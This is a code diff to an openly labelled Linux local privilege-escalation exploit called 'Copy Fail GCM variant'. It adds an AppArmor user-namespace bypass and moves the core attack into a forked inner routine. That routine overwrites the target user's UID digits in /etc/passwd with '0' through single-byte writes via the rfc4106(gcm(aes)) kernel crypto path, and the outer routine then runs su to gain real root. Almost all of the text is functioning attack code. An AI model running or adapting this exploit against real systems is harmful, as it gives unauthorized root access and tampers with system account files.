@@ -15,6 +15,7 @@
  */
 
 #include "copyfail_gcm.h"
+#include "apparmor_bypass.h"
 
 #include <fcntl.h>
 #include <pwd.h>
@@ -426,11 +427,46 @@ bool cfg_1byte_write(const char *p, off_t o, unsigned char b)
  * Top-level exploit (UID flip end-to-end)
  * ---------------------------------------------------------------- */
 
+/* INNER (bypass userns): cfg_1byte_write × 4 to flip UID digits to '0'. */
+df_result_t copyfail_gcm_exploit_inner(void)
+{
+#ifdef __linux__
+    const char *user = getenv("DIRTYFAIL_TARGET_USER");
+    if (!user || !*user) {
+        log_bad("inner: DIRTYFAIL_TARGET_USER not set");
+        return DF_TEST_ERROR;
+    }
+    off_t  uid_off; size_t uid_len; char uid_str[16];
+    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
+        log_bad("inner: find_passwd_uid_field('%s') failed", user);
+        return DF_TEST_ERROR;
+    }
+    if (uid_len != 4) {
+        log_bad("inner: UID '%s' not 4 chars", uid_str);
+        return DF_TEST_ERROR;
+    }
+    for (size_t i = 0; i < 4; i++) {
+        if (uid_str[i] == '0') continue;
+        log_step("inner: flip /etc/passwd[%lld] '%c' -> '0'",
+                 (long long)(uid_off + i), uid_str[i]);
+        if (!cfg_1byte_write("/etc/passwd", uid_off + i, '0')) {
+            log_bad("inner: byte flip failed at offset %lld",
+                    (long long)(uid_off + i));
+            return DF_EXPLOIT_FAIL;
+        }
+    }
+    return DF_EXPLOIT_OK;
+#else
+    return DF_TEST_ERROR;
+#endif
+}
+
+/* OUTER (init ns): prompts → fork bypass child → wait → verify → su. */
 df_result_t copyfail_gcm_exploit(bool do_shell)
 {
     log_step("Copy Fail GCM variant — exploit");
 
-    uid_t target_uid = real_uid_for_target();
+    uid_t target_uid = getuid();
     if (target_uid == 0) {
         log_warn("already root in init namespace");
         return DF_OK;
@@ -454,29 +490,19 @@ df_result_t copyfail_gcm_exploit(bool do_shell)
 
     log_warn("about to flip /etc/passwd UID via rfc4106(gcm(aes)) byte-flips");
     log_warn("(four 1-byte writes — one per UID digit not already '0')");
-    if (!typed_confirm("DIRTYFAIL")) {
-        log_bad("confirmation declined");
-        return DF_OK;
-    }
-    if (!ssh_lockout_check(user)) {
-        log_bad("SSH-lockout confirmation declined — aborting");
-        return DF_OK;
+    if (!typed_confirm("DIRTYFAIL"))    { log_bad("confirmation declined"); return DF_OK; }
+    if (!ssh_lockout_check(user))       { log_bad("ssh-lockout declined");  return DF_OK; }
+
+    setenv("DIRTYFAIL_INNER_MODE",  "gcm", 1);
+    setenv("DIRTYFAIL_TARGET_USER", user,  1);
+
+    int rc = apparmor_bypass_fork_arm(0, NULL);
+    if (rc != DF_EXPLOIT_OK) {
+        log_bad("inner exploit failed (exit=%d)", rc);
+        return DF_EXPLOIT_FAIL;
     }
 
-    /* Flip each UID byte to '0'. We're already in the bypass userns
-     * (main() handled --aa-bypass), so we have CAP_NET_ADMIN here. */
-    for (size_t i = 0; i < 4; i++) {
-        if (uid_str[i] == '0') continue;
-        log_step("flip /etc/passwd[%lld] '%c' -> '0'",
-                 (long long)(uid_off + i), uid_str[i]);
-        if (!cfg_1byte_write("/etc/passwd", uid_off + i, '0')) {
-            log_bad("byte flip failed at offset %lld",
-                    (long long)(uid_off + i));
-            return DF_EXPLOIT_FAIL;
-        }
-    }
-
-    /* Verify */
+    /* Verify in init ns */
     int v = open("/etc/passwd", O_RDONLY);
     if (v < 0) return DF_EXPLOIT_FAIL;
     if (lseek(v, uid_off, SEEK_SET) != uid_off) { close(v); return DF_EXPLOIT_FAIL; }
@@ -497,7 +523,7 @@ df_result_t copyfail_gcm_exploit(bool do_shell)
         return DF_EXPLOIT_OK;
     }
 
-    log_ok("invoking 'su %s' — enter your own password", user);
+    log_ok("invoking 'su %s' in init ns — enter your password for REAL root", user);
     execlp("su", "su", user, (char *)NULL);
     log_bad("execlp: %s", strerror(errno));
     return DF_EXPLOIT_FAIL;
